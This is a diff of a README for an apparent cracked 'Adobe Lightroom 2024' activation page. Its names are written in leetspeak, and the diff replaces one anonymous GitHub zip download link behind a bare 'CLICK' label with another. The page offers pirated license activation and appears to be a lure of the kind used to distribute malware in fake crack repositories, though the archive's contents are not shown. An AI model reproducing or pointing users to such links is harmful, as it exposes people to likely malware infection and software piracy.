@@ -1,5 +1,5 @@
 # L1GHTRO0M-2024
- [CLICK](https://github.com/DerickDidas/Il1ustrat/releases/download/Software/ExRepacks.zip)
+ [CLICK](https://github.com/DerickDidas/Il1ustrat/releases/download/Software/ExSoftware.zip)
 
 ## Ad0be-l1ghtro0m-act1vat10n-l1cense
 
